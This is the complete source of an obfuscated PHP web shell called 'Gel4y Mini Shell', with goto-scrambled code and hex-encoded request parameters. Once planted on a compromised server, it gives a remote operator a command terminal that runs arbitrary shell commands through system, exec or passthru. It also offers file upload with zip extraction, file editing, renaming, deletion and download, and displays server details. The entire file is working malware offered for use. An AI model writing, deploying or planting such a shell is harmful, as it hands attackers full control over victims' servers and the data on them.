<?php
define("FuE", "Gel4y Mini Shell");
if (isset($_GET['l'])) {
    goto GrS;
}
$xn5 = getcwd();
goto abH;
GrS:
$xn5 = u5O($_GET['l']);
chdir($xn5);
abH:
function vcI($LeI)
{
    if (function_exists('system')) {
        goto lZI;
    }
    if (function_exists('exec')) {
        goto VRQ;
    }
    if (function_exists('passthru')) {
        goto ag_;
    }
    if (function_exists('g6n')) {
        goto xSS;
    }
    goto Yup;
    lZI:
    @ob_start();
    @system($LeI);
    $yEV = @ob_get_contents();
    @ob_end_clean();
    return $yEV;
    goto Yup;
    VRQ:
    @exec($LeI, $M4r);
    $yEV = '';
    foreach ($M4r as $S06) {
        $yEV .= $S06;
        Wc5:
    }
    IPU:
    return $yEV;
    goto Yup;
    ag_:
    @ob_start();
    @passthru($LeI);
    $yEV = @ob_get_contents();
    @ob_end_clean();
    return $yEV;
    goto Yup;
    xSS:
    $yEV = @g6n($LeI);
    return $yEV;
    Yup:
}
function M9Q($SS_)
{
    $RkC = fileperms($SS_);
    switch ($RkC & 0xf000) {
        case 0xc000:
            $XHu = 's';
            goto yrK;
        case 0xa000:
            $XHu = 'l';
            goto yrK;
        case 0x8000:
            $XHu = '-';
            goto yrK;
        case 0x6000:
            $XHu = 'b';
            goto yrK;
        case 0x4000:
            $XHu = 'd';
            goto yrK;
        case 0x2000:
            $XHu = 'c';
            goto yrK;
        case 0x1000:
            $XHu = 'p';
            goto yrK;
        default:
            $XHu = 'u';
    }
    K50:
    yrK:
    $XHu .= $RkC & 0x100 ? 'r' : '-';
    $XHu .= $RkC & 0x80 ? 'w' : '-';
    $XHu .= $RkC & 0x40 ? $RkC & 0x800 ? 's' : 'x' : ($RkC & 0x800 ? 'S' : '-');
    $XHu .= $RkC & 0x20 ? 'r' : '-';
    $XHu .= $RkC & 0x10 ? 'w' : '-';
    $XHu .= $RkC & 0x8 ? $RkC & 0x400 ? 's' : 'x' : ($RkC & 0x400 ? 'S' : '-');
    $XHu .= $RkC & 0x4 ? 'r' : '-';
    $XHu .= $RkC & 0x2 ? 'w' : '-';
    $XHu .= $RkC & 0x1 ? $RkC & 0x200 ? 't' : 'x' : ($RkC & 0x200 ? 'T' : '-');
    return $XHu;
}
function qus($x0e)
{
    global $bjr;
    if (!(trim(pathinfo($x0e, PATHINFO_BASENAME), '.') === '')) {
        goto IJW;
    }
    return;
    IJW:
    if (is_dir($x0e)) {
        goto kOi;
    }
    unlink($x0e);
    goto yV2;
    kOi:
    array_map("deldir", glob($x0e . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
    rmdir($x0e);
    yV2:
}
function U5o($Ei_, $Fjj = true, $qnW = 0)
{
    $g4R = '';
    $api = strlen($Ei_);
    if ($Fjj == false) {
        goto GwC;
    }
    UMq:
    if (!($qnW < $api - 1)) {
        goto xlD;
    }
    $g4R .= chr(hexdec("{$Ei_[$qnW]}{$Ei_[$qnW + 1]}"));
    L4e:
    $qnW += 2;
    goto UMq;
    xlD:
    goto wMh;
    GwC:
    gat:
    if (!($qnW < $api)) {
        goto TZG;
    }
    $g4R .= dechex(ord($Ei_[$qnW]));
    EeC:
    $qnW++;
    goto gat;
    TZG:
    wMh:
    return $g4R;
}
function Ytx($CAT, $jWh = 1, $HXI = "")
{
    global $xn5;
    $laH = $jWh == 1 ? "success" : "error";
    echo "<script>swal({title: \"{$laH}\", text: \"{$CAT}\", icon: \"{$laH}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?l=" . U5O($xn5, 0) . $HXI . "\"}})</script>";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="theme-color" content="red">
  <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <title></title>
  <style>
    body {
      color: #fff;
      font-family: serif;
      background-color: #000;
    }
    a, a:hover, pre {
      color: #fff;
    }
    .table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}
    .form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}
  </style>
  <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body>
  <main class="my-1">
    <div class="border bg-dark px-1">
      <div class="d-flex justify-content-between">
        <div>
          <h3 class="mt-2"><a href="?"><?php 
echo FuE;
?></a></h3>
        </div>
        <div>
          <span>PHP Version: <?php 
echo phpversion();
?></span><br>
          <a href="<?php 
echo "?l=" . U5O($xn5, 0) . "&a=" . U5O("cdir", 0);
?>"><i class="fa fa-plus-circle"></i> Folder</a> |
          <a href="<?php 
echo "?l=" . U5O($xn5, 0) . "&a=" . u5o("cfile", 0);
?>"><i class="fa fa-plus-circle"></i> File</a> |
          <a href="<?php 
echo "?l=" . U5o($xn5, 0) . "&a=" . U5o("term", 0);
?>"><i class="fa fa-terminal"></i></a>
        </div>
      </div>
      <div class="border-top">
        <ul style="list-style:none;" class="m-0 p-0">
          <li><b>Server</b>: <?php 
echo "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]})";
?></li>
          <li><b>PHP Uname</b>: <?php 
echo php_uname();
?></li>
        </ul>
      </div>
      <form method="post" enctype="multipart/form-data">
        <div class="input-group mb-1">
          <div class="custom-file">
            <input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple>
            <label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label>
          </div>
        </div>
      </form>
      <?php 
if (!isset($_FILES['f'])) {
    goto E6Y;
}
$SOl = $_FILES['f']['name'];
$qnW = 0;
sKq:
if (!($qnW < count($SOl))) {
    goto LNu;
}
$gVG = $_FILES['f']['tmp_name'];
$mQM = $_FILES['f']['type'];
$m4y = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
if (move_uploaded_file($gVG[$qnW], $SOl[$qnW])) {
    goto m4g;
}
yTX("file failed to upload", 0);
goto AlR;
m4g:
if (!in_array($mQM[$qnW], $m4y)) {
    goto JPu;
}
$gdZ = new ZipArchive();
$WNV = $gdZ->open($SOl[$qnW]);
if (!($WNV == true)) {
    goto Z5E;
}
$gdZ->extractTo(basename($SOl[$qnW], '.zip'));
$gdZ->close();
Z5E:
JPu:
ytX("file uploaded successfully");
AlR:
z4V:
$qnW++;
goto sKq;
LNu:
E6Y:
if (!isset($_GET["download"])) {
    goto vcG;
}
header("Content-Type: application/octet-stream");
header("Content-Transfer-Encoding: Binary");
header("Content-Length: " . strtotime(U5o($_GET["n"])));
header("Content-disposition: attachment; filename=\"" . u5o($_GET["n"]) . "\"");
vcG:
?>
    </div>
    <div class="border bg-dark my-2 py-2 table-responsive">
      <div class="mx-2">
        <span>Path:</span>
        <?php 
$KGw = preg_split("/(\\\\|\\/)/", $xn5);
foreach ($KGw as $CtC => $ALt) {
    if (!($CtC == 0 && $ALt == "")) {
        goto XMF;
    }
    echo "<a href=\"?l=2f\">~</a>/";
    goto yMD;
    XMF:
    if (!($ALt == "")) {
        goto o15;
    }
    goto yMD;
    o15:
    echo "<a href=\"?l=";
    $qnW = 0;
    qOs:
    if (!($qnW <= $CtC)) {
        goto u1a;
    }
    echo U5O($KGw[$qnW], 0);
    if (!($qnW != $CtC)) {
        goto r7n;
    }
    echo "2f";
    r7n:
    UEF:
    $qnW++;
    goto qOs;
    u1a:
    echo "\">{$ALt}</a>/";
    yMD:
}
NcF:
?>
      </div>
    </div>
    <article class="bg-dark border table-responsive">
    <?php 
if (!isset($_GET["a"])) {
    goto lAe;
}
if (!isset($_GET["a"])) {
    goto i2O;
}
$EmZ = u5O($_GET["a"]);
?>
    <div class="px-2 py-2">
    <?php 
if (!($EmZ == "delete")) {
    goto pnr;
}
$HXI = $xn5 . '/' . u5o($_GET["n"]);
if (!($_GET["t"] == "d")) {
    goto mpj;
}
qUs($HXI);
if (!file_exists($HXI)) {
    goto oxH;
}
yTX("failed to delete the folder", 0);
goto i4l;
oxH:
Ytx("folder deleted successfully");
i4l:
mpj:
if (!($_GET["t"] == "f")) {
    goto dYD;
}
$HXI = $xn5 . '/' . U5O($_GET["n"]);
unlink($HXI);
if (!file_exists($HXI)) {
    goto Zh7;
}
YTX("file to delete the folder", 0);
goto jZj;
Zh7:
ytX("file deleted successfully");
jZj:
dYD:
pnr:
?>
    <?php 
if ($EmZ == "cfile") {
    goto dOZ;
}
if ($EmZ == "cdir") {
    goto fQt;
}
if ($EmZ == "term") {
    goto U6J;
}
if ($EmZ == 'edit') {
    goto e9j;
}
if ($EmZ == 'rename') {
    goto o8K;
}
if ($EmZ == 'view') {
    goto WMV;
}
goto vTq;
dOZ:
?>
    <h5>New folder</h5>
    <form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
    <?php 
isset($_POST["s"]) ? file_exists("{$xn5}/{$_POST["n"]}") ? ytX("file name has been used", 0, "&a=" . U5O("cfile", 0)) : (file_put_contents("{$xn5}/{$_POST["n"]}", $_POST["ctn"]) ? YTX("file created successfully", 1, "&a=" . u5o("view", 0) . "&n=" . U5O($_POST["n"], 0)) : YtX("file failed to create", 0)) : null;
goto vTq;
fQt:
?>
    <h5>New folder</h5>
    <form method="post">
      <div class="form-group">
        <label for="n">Name :</label>
        <input name="n" id="n" class="form-control" autocomplete="off">
      </div>
      <div class="form-group">
        <button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
      </div>
    </form>
    <?php 
isset($_POST["s"]) ? file_exists("{$xn5}/{$_POST["n"]}") ? ytX("folder name has been used", 0, "&a=" . U5o("cdir", 0)) : (mkdir("{$xn5}/{$_POST["n"]}") ? Ytx("folder created successfully", 1, U5O("/" . $_POST["n"], 0)) : YTx("folder failed to create", 0)) : null;
goto vTq;
U6J:
?>
    <pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php 
echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . vcI($_POST["cmd"]) : "";
?></pre>
    <form method="post">
      <div class="form-group">
        <input type="text" name="cmd" class="form-control">
      </div>
    </form>
    <?php 
goto vTq;
e9j:
?>
    <h5>Edit file</h5>
    <span>File name : <?php 
echo u5O($_GET["n"]);
?></span>
<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php 
echo htmlspecialchars(file_get_contents($xn5 . '/' . u5o($_GET["n"])));
?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
    <?php 
isset($_POST["s"]) ? file_put_contents($xn5 . '/' . u5O($_GET["n"]), $_POST["ctn"]) ? yTX("file contents changed successfully", 1, "&a=" . U5o("view", 0) . "&n={$_GET["n"]}") : Ytx("file contents failed to change") : null;
goto vTq;
o8K:
?>
    <h5>View <?php 
echo $_GET["t"] == "d" ? "folder" : "file";
?></h5>
    <form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php 
echo u5O($_GET["n"]);
?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
    <?php 
isset($_POST["s"]) ? rename($xn5 . '/' . U5O($_GET["n"]), $_POST["n"]) ? ytX("successfully changed the name") : Ytx("failed to change the name", 0) : null;
goto vTq;
WMV:
?>
    <h5>View file</h5>
<span>File name : <?php 
echo U5O($_GET["n"]);
?></span>
<div class="form-group"><label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php 
echo htmlspecialchars(file_get_contents($xn5 . '/' . U5O($_GET["n"])));
?></textarea></div>
    <?php 
vTq:
?>
    </div>
    <?php 
i2O:
?>
    <?php 
goto KWN;
lAe:
?>
    <table class="table table-hover table-borderless table-sm">
      <thead class="text-light">
        <tr>
          <th>Name</th>
          <th>Size</th>
          <th>Permission</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody>
        <?php 
$aFR = array_diff(scandir($xn5), ['.', '..']);
foreach ($aFR as $YkI) {
    if (is_dir("{$xn5}/{$YkI}")) {
        goto FZy;
    }
    goto nwy;
    FZy:
    echo "<tr>\n          <td><a href=\"?l=" . U5O("{$xn5}/{$YkI}", 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$xn5}/{$YkI}")) . "\"><i class=\"fa fa-fw fa-folder" . (count(scandir("{$xn5}/{$YkI}")) == 0 ? "" : "-open") . " text-warning\"></i> {$YkI}</a></td>\n          <td>N/A</td>\n          <td><font color=\"" . (is_writable("{$xn5}/{$YkI}") ? "#00ff00" : (!is_readable("{$xn5}/{$YkI}") ? "red" : null)) . "\">" . M9Q("{$xn5}/{$YkI}") . "</font></td>\n          <td>\n            <a href=\"?l=" . u5O($xn5, 0) . "&a=" . U5O("rename", 0) . "&n=" . U5O($YkI, 0) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n            <a href=\"?l=" . U5o($xn5, 0) . "&a=" . u5o("delete", 0) . "&n=" . U5o($YkI, 0) . "&t=f\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n          </td></tr>";
    nwy:
}
u2B:
foreach ($aFR as $SS_) {
    if (is_file("{$xn5}/{$SS_}")) {
        goto mY2;
    }
    goto buu;
    mY2:
    $u0V = filesize("{$xn5}/{$SS_}") / 1024;
    $u0V = round($u0V, 3);
    $u0V = $u0V > 1024 ? round($u0V / 1024, 2) . "MB" : $u0V . "KB";
    echo "<tr>\n\t        <td><a href=\"?l=" . U5O($xn5, 0) . "&a=" . u5O("view", 0) . "&n=" . u5o($SS_, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$xn5}/{$SS_}")) . "\"><i class=\"fa fa-fw fa-file" . ($_SERVER["SCRIPT_FILENAME"] == "{$xn5}/{$SS_}" ? " text-danger" : "") . "\"></i> {$SS_}</a></td>\n\t        <td>{$u0V}</td>\n\t        <td><font color=\"" . (is_writable("{$xn5}/{$SS_}") ? "#00ff00" : (!is_readable("{$xn5}/{$SS_}") ? "red" : null)) . "\">" . M9Q("{$xn5}/{$SS_}") . "</font></td>\n\t        <td>\n\t          <div class=\"d-flex justify-content-between\">\n\t            <a href=\"?l=" . u5O($xn5, 0) . "&a=" . U5O("edit", 0) . "&n=" . u5o($SS_, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t            <a href=\"?l=" . u5O($xn5, 0) . "&a=" . u5o("rename", 0) . "&n=" . u5o($SS_, 0) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t            <a href=\"?l=" . U5O($xn5, 0) . "&n=" . U5O($SS_, 0) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t            <a href=\"?l=" . u5o($xn5, 0) . "&a=" . U5o("delete", 0) . "&n=" . U5o($SS_, 0) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t          </div>\n\t        </td></tr>";
    buu:
}
bBA:
?>
      </tbody>
    </table>
    <?php 
KWN:
?>
    </article>
    <div class="bg-dark border text-center mt-2 py-2"><small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small></div>
  </main>
  <script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>
